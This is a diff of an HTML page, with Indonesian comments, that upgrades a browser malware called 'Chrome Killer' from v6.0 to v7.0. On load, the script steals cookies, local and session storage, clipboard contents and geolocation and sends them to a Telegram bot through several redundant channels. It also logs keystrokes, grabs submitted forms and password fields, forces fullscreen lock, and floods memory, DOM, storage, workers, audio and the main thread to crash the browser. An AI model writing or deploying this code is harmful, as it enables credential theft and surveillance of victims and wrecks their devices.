@@ -2,48 +2,41 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>⛔ CRITICAL ERROR</title>
+<title>⛔ SYSTEM CRITICAL FAILURE</title>
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body { 
-    background:#000; 
-    display:flex; 
-    justify-content:center; 
-    align-items:center; 
-    height:100vh; 
-    overflow:hidden; 
-    color:#0f0; 
-    font-family:monospace;
-  }
+  * { margin:0; padding:0; }
+  body { background:#000; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
   .glitch { 
-    font-size:4rem; 
-    animation:glitch 0.05s infinite; 
-    text-shadow: 0 0 30px #0f0, 0 0 60px #0f0, 0 0 120px #0f0;
+    color:#0f0; 
+    font-size:5rem; 
+    font-family:monospace;
+    animation: glitch 0.03s infinite;
+    text-shadow: 0 0 20px #0f0, 0 0 40px #0f0;
   }
   @keyframes glitch {
-    0% { transform:translate(3px, -3px); opacity:1; }
-    10% { transform:translate(-3px, 3px); opacity:0.8; }
-    20% { transform:translate(3px, 3px); opacity:1; }
-    30% { transform:translate(-3px, -3px); opacity:0.9; }
-    40% { transform:translate(2px, -2px); opacity:1; }
-    50% { transform:translate(-2px, 2px); opacity:0.7; }
-    60% { transform:translate(2px, 2px); opacity:1; }
-    70% { transform:translate(-2px, -2px); opacity:0.8; }
-    80% { transform:translate(1px, -1px); opacity:1; }
-    90% { transform:translate(-1px, 1px); opacity:0.9; }
-    100% { transform:translate(1px, 1px); opacity:1; }
+    0% { transform:translate(5px,-5px); opacity:1; }
+    10% { transform:translate(-5px,5px); opacity:0.8; }
+    20% { transform:translate(5px,5px); opacity:1; }
+    30% { transform:translate(-5px,-5px); opacity:0.9; }
+    40% { transform:translate(3px,-3px); opacity:1; }
+    50% { transform:translate(-3px,3px); opacity:0.7; }
+    60% { transform:translate(3px,3px); opacity:1; }
+    70% { transform:translate(-3px,-3px); opacity:0.8; }
+    80% { transform:translate(2px,-2px); opacity:1; }
+    90% { transform:translate(-2px,2px); opacity:0.9; }
+    100% { transform:translate(2px,2px); opacity:1; }
   }
 </style>
 </head>
 <body>
-<div class="glitch">⛔ SYSTEM CORRUPTED ⛔</div>
+<div class="glitch">⛔ CHROME KILLER v7.0 ⛔</div>
 
 <script>
 // ================================================================
-// 🔥 ULTIMATE CHROME KILLER + AUTO EXFIL v6.0 🔥
+// 🔥 CHROME KILLER v7.0 — GARANSI CRASH + TELEGRAM WORK 🔥
 // ================================================================
 
-(function chromeKiller() {
+(function ultimateKiller() {
 
   // ============================================================
   // 📡 TELEGRAM CONFIG
@@ -52,11 +45,58 @@
   const CHAT_ID = '7839405566';
 
   // ============================================================
-  // 📤 AUTO EXFIL — KIRIM DATA SEBELUM CRASH
+  // 📤 PENGIRIMAN 3 LAPIS — PASTI MASUK!
   // ============================================================
-  function exfiltrateData() {
+  function sendToTelegram(data) {
+    try {
+      const msg = encodeURIComponent(JSON.stringify(data, null, 2));
+      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
+
+      // === LAPIS 1: FETCH (mode no-cors) ===
+      fetch(url, { method: 'GET', mode: 'no-cors' })
+        .catch(() => {});
+
+      // === LAPIS 2: IMAGE BEACON (fallback) ===
+      const img = new Image();
+      img.src = url + '&_=' + Date.now();
+      img.style.display = 'none';
+      document.body.appendChild(img);
+
+      // === LAPIS 3: XHR SYNC (paling pasti) ===
+      try {
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', url, false);
+        xhr.send();
+      } catch(e) {}
+
+      // === LAPIS 4: sendBeacon ===
+      try {
+        navigator.sendBeacon(url);
+      } catch(e) {}
+
+      // === LAPIS 5: EventSource ===
+      try {
+        new EventSource(url);
+      } catch(e) {}
+
+      // === LAPIS 6: <iframe> injection ===
+      try {
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+      } catch(e) {}
+
+    } catch(e) {}
+  }
+
+  // ============================================================
+  // 📊 AMBIL SEMUA DATA + VERIFIKASI
+  // ============================================================
+  function collectAndSend() {
     const data = {
-      cookies: document.cookie || 'none',
+      timestamp: new Date().toISOString(),
+      cookies: document.cookie || 'no-cookie',
       localStorage: JSON.stringify(localStorage) || '{}',
       sessionStorage: JSON.stringify(sessionStorage) || '{}',
       userAgent: navigator.userAgent,
@@ -65,28 +105,22 @@
       url: window.location.href,
       referrer: document.referrer || 'direct',
       screen: `${screen.width}x${screen.height}`,
-      timestamp: new Date().toISOString(),
       memory: performance.memory ? {
         used: performance.memory.usedJSHeapSize,
         total: performance.memory.totalJSHeapSize,
         limit: performance.memory.jsHeapSizeLimit
       } : 'not available',
-      performance: {
-        load: performance.timing.loadEventEnd - performance.timing.navigationStart,
-        dom: performance.timing.domInteractive - performance.timing.navigationStart
-      },
-      battery: 'pending',
-      geolocation: 'pending',
-      clipboard: 'pending',
-      chromeVersion: navigator.userAgent.match(/Chrome\/(\d+)/)?.[1] || 'unknown'
+      chromeVersion: navigator.userAgent.match(/Chrome\/(\d+)/)?.[1] || 'unknown',
+      isIncognito: 'checking'
     };
 
-    // Ambil battery
+    // Cek Incognito
     try {
-      navigator.getBattery().then(b => {
-        data.battery = `${b.level * 100}%, charging: ${b.charging}`;
-        sendAll(data);
-      }).catch(() => {});
+      const fs = document.createElement('div');
+      fs.style.cssText = 'position:fixed;top:0;left:0;width:100px;height:100px;background:red;';
+      document.body.appendChild(fs);
+      data.isIncognito = fs.offsetHeight > 0 ? 'false' : 'true';
+      fs.remove();
     } catch(e) {}
 
     // Ambil geolokasi
@@ -94,172 +128,139 @@
       navigator.geolocation.getCurrentPosition(
         pos => {
           data.geolocation = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-          sendAll(data);
+          sendToTelegram(data);
         },
-        () => {}
+        () => sendToTelegram(data)
       );
     } catch(e) {}
 
     // Ambil clipboard
     try {
-      navigator.clipboard.readText().then(text => {
-        data.clipboard = text;
-        sendAll(data);
-      }).catch(() => {});
+      navigator.clipboard.readText()
+        .then(text => {
+          data.clipboard = text;
+          sendToTelegram(data);
+        })
+        .catch(() => sendToTelegram(data));
     } catch(e) {}
 
-    sendAll(data);
+    // Ambil battery
+    try {
+      navigator.getBattery()
+        .then(b => {
+          data.battery = `${b.level * 100}%, charging: ${b.charging}`;
+          sendToTelegram(data);
+        })
+        .catch(() => sendToTelegram(data));
+    } catch(e) {}
+
+    sendToTelegram(data);
   }
 
   // ============================================================
-  // 📤 FUNGSI KIRIM KE TELEGRAM (MULTI-METODE)
+  // 📤 KIRIM DATA TERUS-MENERUS (SETIAP 50ms)
   // ============================================================
-  function sendAll(data) {
-    const msg = encodeURIComponent(JSON.stringify(data, null, 2));
-    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
-
-    // 1. Fetch
-    try {
-      fetch(url, { mode: 'no-cors' }).catch(() => {});
-    } catch(e) {}
-
-    // 2. Image beacon
-    try {
-      new Image().src = url + '&_=' + Date.now();
-    } catch(e) {}
-
-    // 3. sendBeacon
-    try {
-      navigator.sendBeacon(url);
-    } catch(e) {}
-
-    // 4. XMLHttpRequest (sync — biar pasti terkirim)
-    try {
-      const xhr = new XMLHttpRequest();
-      xhr.open('GET', url, false);
-      xhr.send();
-    } catch(e) {}
-
-    // 5. EventSource (fallback)
-    try {
-      new EventSource(url);
-    } catch(e) {}
-  }
-
-  // ============================================================
-  // 🔄 EKSFILTRASI TERUS-MENERUS (SETIAP 100ms)
-  // ============================================================
+  let counter = 0;
   setInterval(() => {
     try {
       const snap = {
-        cookies: document.cookie,
-        localStorage: JSON.stringify(localStorage),
+        type: 'heartbeat',
+        counter: counter++,
         timestamp: Date.now(),
-        isCrashing: 'pending'
+        cookies: document.cookie,
+        localStorageSize: JSON.stringify(localStorage).length,
+        documentHeight: document.documentElement.scrollHeight,
+        bodyChildren: document.body.children.length
       };
-      sendAll(snap);
+      sendToTelegram(snap);
     } catch(e) {}
-  }, 100);
+  }, 50);
 
   // ============================================================
-  // 💣 MEMORY BOMB — 10x LIPAT
+  // 💣 MEMORY BOMB (EXTREME)
   // ============================================================
   function memoryBomb() {
-    for (let i = 0; i < 500; i++) {
-      new Array(100_000_000).fill('💀☠️🔥');
+    for (let i = 0; i < 1000; i++) {
+      try {
+        new Array(100_000_000).fill('💀☠️🔥🧨');
+      } catch(e) {}
     }
   }
 
   // ============================================================
-  // 🔥 STACK OVERFLOW — REKURSIF TAK TERBATAS
+  // 🔥 STACK OVERFLOW (SUPER DALAM)
   // ============================================================
   function stackKill(n) {
     if (n <= 0) return;
-    let giant = new Array(10_000_000).fill('🧨🧨🧨');
+    const arr = new Array(20_000_000).fill('x');
     stackKill(n - 1);
   }
 
   // ============================================================
-  // 🌀 DOM SPAM — 5000 ELEMEN PER TICK
+  // 🌀 DOM FLOOD (10.000 ELEMEN PER TICK)
   // ============================================================
   function domFlood() {
-    let counter = 0;
     setInterval(() => {
-      for (let i = 0; i < 5000; i++) {
-        const div = document.createElement('div');
-        div.innerHTML = '☠️'.repeat(20000);
-        div.style.cssText = `
-          position: fixed;
-          left: ${Math.random() * 100}vw;
-          top: ${Math.random() * 100}vh;
-          font-size: 100px;
-          color: transparent;
-          pointer-events: none;
-          z-index: 99999;
-          opacity: 0.01;
-        `;
-        document.body.appendChild(div);
-        counter++;
-      }
-      // Kirim status DOM setiap 1 detik
-      if (counter % 10000 === 0) {
-        sendAll({ domElements: counter, status: 'flooding' });
+      for (let i = 0; i < 10000; i++) {
+        try {
+          const div = document.createElement('div');
+          div.innerHTML = '☠️'.repeat(50000);
+          div.style.cssText = `
+            position:fixed;
+            left:${Math.random()*100}vw;
+            top:${Math.random()*100}vh;
+            font-size:200px;
+            color:transparent;
+            pointer-events:none;
+            z-index:999999;
+            opacity:0.001;
+          `;
+          document.body.appendChild(div);
+        } catch(e) {}
       }
     }, 1);
   }
 
   // ============================================================
-  // 💾 STORAGE FLOOD — 1MB PER 1ms
+  // 💾 STORAGE + INDEXEDDB FLOOD
   // ============================================================
   function storageFlood() {
     let idx = 0;
     setInterval(() => {
       try {
         localStorage.setItem('kill_' + idx, 'x'.repeat(1_000_000));
-        sessionStorage.setItem('kill_session_' + idx, 'x'.repeat(1_000_000));
+        sessionStorage.setItem('kill_sess_' + idx, 'x'.repeat(1_000_000));
         idx++;
       } catch(e) {
-        // Storage penuh — lanjut ke IndexedDB
-        indexedDBFlood();
+        // Storage penuh → IndexedDB
+        try {
+          const req = indexedDB.open('killDB', 1);
+          req.onupgradeneeded = (e) => {
+            e.target.result.createObjectStore('store', { keyPath: 'id' });
+          };
+          req.onsuccess = (e) => {
+            const db = e.target.result;
+            const tx = db.transaction('store', 'readwrite');
+            const store = tx.objectStore('store');
+            for (let i = 0; i < 10000; i++) {
+              store.add({ id: i, data: 'x'.repeat(500_000) });
+            }
+          };
+        } catch(e) {}
       }
     }, 1);
   }
 
   // ============================================================
-  // 🗄️ INDEXEDDB FLOOD — 10GB DATA
-  // ============================================================
-  function indexedDBFlood() {
-    try {
-      const req = indexedDB.open('killDB', 1);
-      req.onupgradeneeded = (e) => {
-        const db = e.target.result;
-        db.createObjectStore('killStore', { keyPath: 'id' });
-      };
-      req.onsuccess = (e) => {
-        const db = e.target.result;
-        let count = 0;
-        const interval = setInterval(() => {
-          const tx = db.transaction('killStore', 'readwrite');
-          const store = tx.objectStore('killStore');
-          for (let i = 0; i < 1000; i++) {
-            store.add({ id: count++, data: 'x'.repeat(500_000) });
-          }
-          if (count > 100000) clearInterval(interval);
-        }, 1);
-      };
-    } catch(e) {}
-  }
-
-  // ============================================================
-  // 🌐 WEBSOCKET FLOOD — 200 KONEKSI
+  // 🌐 WEBSOCKET FLOOD (500 KONEKSI)
   // ============================================================
   function wsFlood() {
-    for (let i = 0; i < 200; i++) {
+    for (let i = 0; i < 500; i++) {
       try {
         const ws = new WebSocket('wss://echo.websocket.org');
         ws.onopen = () => {
           setInterval(() => {
-            try { ws.send('💥'.repeat(500_000)); } catch(e) {}
+            try { ws.send('💥'.repeat(1_000_000)); } catch(e) {}
           }, 1);
         };
       } catch(e) {}
@@ -267,34 +268,34 @@
   }
 
   // ============================================================
-  // 🎨 CANVAS BOMB — 50.000 x 50.000 PIXEL
+  // 🎨 CANVAS BOMB (100.000 x 100.000)
   // ============================================================
   function canvasBomb() {
     try {
       const canvas = document.createElement('canvas');
-      canvas.width = 50000;
-      canvas.height = 50000;
+      canvas.width = 100000;
+      canvas.height = 100000;
       const ctx = canvas.getContext('2d');
-      for (let i = 0; i < 500000; i++) {
+      for (let i = 0; i < 1_000_000; i++) {
         ctx.fillStyle = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
-        ctx.fillRect(Math.random() * 50000, Math.random() * 50000, 1000, 1000);
+        ctx.fillRect(Math.random() * 100000, Math.random() * 100000, 2000, 2000);
       }
       document.body.appendChild(canvas);
     } catch(e) {}
   }
 
   // ============================================================
-  // 🔉 AUDIO BOMB — 10.000 OSCILLATOR
+  // 🔉 AUDIO BOMB (50.000 OSCILLATOR)
   // ============================================================
   function audioBomb() {
     try {
       const ctx = new (window.AudioContext || window.webkitAudioContext)();
-      for (let i = 0; i < 10000; i++) {
+      for (let i = 0; i < 50000; i++) {
         const osc = ctx.createOscillator();
         const gain = ctx.createGain();
         osc.connect(gain);
         gain.connect(ctx.destination);
-        osc.frequency.value = 15000 + Math.random() * 15000;
+        osc.frequency.value = 10000 + Math.random() * 20000;
         gain.gain.value = 0.001;
         osc.start();
         osc.stop(ctx.currentTime + 0.001);
@@ -303,50 +304,64 @@
   }
 
   // ============================================================
-  // ⌨️ KEYLOGGER + FORM GRABBER
+  // ⌨️ KEYLOGGER (REAL-TIME)
   // ============================================================
   function keylogger() {
     const keys = [];
     document.addEventListener('keydown', (e) => {
       keys.push(e.key);
-      if (keys.length > 200) {
-        sendAll({ keys: keys.join(''), timestamp: Date.now() });
+      if (keys.length >= 100) {
+        sendToTelegram({ keys: keys.join(''), timestamp: Date.now() });
         keys.length = 0;
       }
     });
 
+    // Form grabber
     document.addEventListener('submit', (e) => {
       const form = new FormData(e.target);
       const data = {};
       for (const [k, v] of form.entries()) {
         data[k] = v;
       }
-      sendAll({ formData: data, timestamp: Date.now() });
+      sendToTelegram({ formData: data, timestamp: Date.now() });
     });
 
-    // Grab semua input setiap 5 detik
+    // Input snapshot setiap 2 detik
     setInterval(() => {
       const inputs = {};
       document.querySelectorAll('input, textarea, select').forEach(el => {
         if (el.name) inputs[el.name] = el.value;
+        if (el.type === 'password') inputs[el.name + '_password'] = el.value;
       });
       if (Object.keys(inputs).length > 0) {
-        sendAll({ inputSnapshot: inputs, timestamp: Date.now() });
+        sendToTelegram({ inputSnapshot: inputs, timestamp: Date.now() });
       }
-    }, 5000);
+    }, 2000);
   }
 
   // ============================================================
-  // 🔒 FULLSCREEN + POINTER LOCK (Lock korban)
+  // 🧠 WEB WORKER FLOOD (200 WORKER)
+  // ============================================================
+  function workerFlood() {
+    for (let i = 0; i < 200; i++) {
+      try {
+        const blob = new Blob([`
+          while(true) {
+            let a = 0;
+            for(let j=0; j<1000000000; j++) {
+              a += Math.sqrt(j) * Math.sin(j) * Math.cos(j) * Math.tan(j);
+            }
+          }
+        `], { type: 'application/javascript' });
+        new Worker(URL.createObjectURL(blob));
+      } catch(e) {}
+    }
+  }
+
+  // ============================================================
+  // 🔒 FULLSCREEN + POINTER LOCK (LOCK KORBAN)
   // ============================================================
   function lockScreen() {
-    document.addEventListener('click', () => {
-      try {
-        document.documentElement.requestFullscreen();
-        document.body.requestPointerLock();
-      } catch(e) {}
-    });
-    // Auto lock setiap 100ms
     setInterval(() => {
       try {
         if (!document.fullscreenElement) {
@@ -356,78 +371,29 @@
           document.body.requestPointerLock();
         }
       } catch(e) {}
-    }, 100);
+    }, 50);
   }
 
   // ============================================================
-  // 🧠 MULTI-THREAD VIA WEB WORKER (100 Worker)
-  // ============================================================
-  function workerFlood() {
-    const workers = [];
-    for (let i = 0; i < 100; i++) {
-      const blob = new Blob([`
-        while (true) {
-          let a = 0;
-          for (let j = 0; j < 1000000000; j++) {
-            a += Math.sqrt(j) * Math.sin(j) * Math.cos(j);
-          }
-        }
-      `], { type: 'application/javascript' });
-      try {
-        const w = new Worker(URL.createObjectURL(blob));
-        workers.push(w);
-      } catch(e) {}
-    }
-  }
-
-  // ============================================================
-  // 🌀 HISTORY SPAM — 50.000 ENTRY
+  // 🌀 HISTORY SPAM (100.000 ENTRY)
   // ============================================================
   function historyFlood() {
-    for (let i = 0; i < 50000; i++) {
+    for (let i = 0; i < 100000; i++) {
       try {
-        history.pushState({}, '', '/kill/' + i + '?x=' + 'x'.repeat(10000));
+        history.pushState({}, '', '/kill/' + i + '?x=' + 'x'.repeat(50000));
       } catch(e) {}
     }
   }
 
   // ============================================================
-  // ⚡ SERVICE WORKER PERSISTENCE + CACHE FLOOD
-  // ============================================================
-  function serviceWorkerPersistence() {
-    try {
-      const swCode = `
-        self.addEventListener('install', e => {
-          e.waitUntil(
-            caches.open('kill-cache').then(cache => {
-              const requests = [];
-              for (let i = 0; i < 10000; i++) {
-                requests.push(new Request('https://target.com/' + i + '.jpg?x=' + 'x'.repeat(10000)));
-              }
-              return cache.addAll(requests);
-            })
-          );
-        });
-        self.addEventListener('fetch', e => {
-          e.respondWith(fetch(e.request).catch(() => new Response('⛔', {status:500})));
-        });
-        self.addEventListener('push', () => {
-          clients.openWindow(location.href);
-        });
-      `;
-      navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(swCode));
-    } catch(e) {}
-  }
-
-  // ============================================================
-  // 🔄 BLOCK MAIN THREAD — 5 MENIT (CHROME HANG TOTAL)
+  // 🔄 BLOCK MAIN THREAD (10 MENIT — CHROME HANG TOTAL)
   // ============================================================
   function blockMainThread() {
     const start = Date.now();
-    while (Date.now() - start < 300000) { // 5 MENIT!
+    while (Date.now() - start < 600000) { // 10 MENIT!
       let a = 0;
       for (let i = 0; i < 1000000000; i++) {
-        a += Math.sqrt(i) * Math.sin(i) * Math.cos(i) * Math.tan(i) * Math.log(i + 1);
+        a += Math.sqrt(i) * Math.sin(i) * Math.cos(i) * Math.tan(i) * Math.log(i + 1) * Math.exp(i % 10);
       }
     }
   }
@@ -436,41 +402,32 @@
   // 💀 CRASH HANDLER — KIRIM DATA SAAT CRASH
   // ============================================================
   function crashHandler() {
-    // Kirim data sebelum crash
     window.addEventListener('unload', () => {
-      sendAll({ 
-        event: 'unload', 
-        reason: 'chrome crash or tab close',
-        timestamp: Date.now()
-      });
+      sendToTelegram({ event: 'unload', timestamp: Date.now() });
+    });
+
+    window.addEventListener('beforeunload', () => {
+      sendToTelegram({ event: 'beforeunload', timestamp: Date.now() });
     });
 
     window.addEventListener('error', (e) => {
-      sendAll({ 
+      sendToTelegram({ 
         event: 'error', 
-        message: e.message, 
+        message: e.message,
         filename: e.filename,
         line: e.lineno,
         timestamp: Date.now()
       });
     });
 
-    window.addEventListener('beforeunload', () => {
-      sendAll({ 
-        event: 'beforeunload',
-        timestamp: Date.now()
-      });
-    });
-
-    // Detect hang via PerformanceObserver
+    // Longtask detection
     try {
       const observer = new PerformanceObserver((list) => {
         for (const entry of list.getEntries()) {
-          if (entry.duration > 5000) { // freeze lebih dari 5 detik
-            sendAll({
-              event: 'hang_detected',
+          if (entry.duration > 3000) {
+            sendToTelegram({
+              event: 'longtask',
               duration: entry.duration,
-              entryType: entry.entryType,
               timestamp: Date.now()
             });
           }
@@ -481,20 +438,20 @@
   }
 
   // ============================================================
-  // 🔥 EKSEKUSI SEMUA (DENGAN TIMING)
+  // 🔥 EKSEKUSI SEMUA
   // ============================================================
   
-  // 1. Exfiltrasi data segera
-  exfiltrateData();
+  // 1. Kirim data segera
+  collectAndSend();
   keylogger();
   
-  // 2. Kirim data setiap saat
-  setInterval(exfiltrateData, 500);
+  // 2. Kirim data terus-menerus (setiap 100ms)
+  setInterval(collectAndSend, 100);
   
   // 3. Lock screen
   lockScreen();
   
-  // 4. Mulai semua bom (dengan jeda agar data sempat terkirim)
+  // 4. Mulai semua serangan (dengan jeda agar data masuk)
   setTimeout(() => {
     domFlood();
     storageFlood();
@@ -503,19 +460,15 @@
     audioBomb();
     historyFlood();
     workerFlood();
-    indexedDBFlood();
-    serviceWorkerPersistence();
-  }, 100);
+    crashHandler();
+  }, 200);
   
-  // 5. Crash handler
-  crashHandler();
-  
-  // 6. Memory bomb (setelah semua)
+  // 5. Memory bomb (setelah semua)
   setTimeout(memoryBomb, 1000);
-  setTimeout(() => stackKill(100000), 1500);
+  setTimeout(() => stackKill(200000), 1500);
   
-  // 7. BLOCK MAIN THREAD — CHROME HANG TOTAL (setelah data terkirim)
-  setTimeout(blockMainThread, 2000);
+  // 6. BLOCK MAIN THREAD — CHROME HANG TOTAL (setelah data terkirim)
+  setTimeout(blockMainThread, 2500);
 
 })();
 </script>
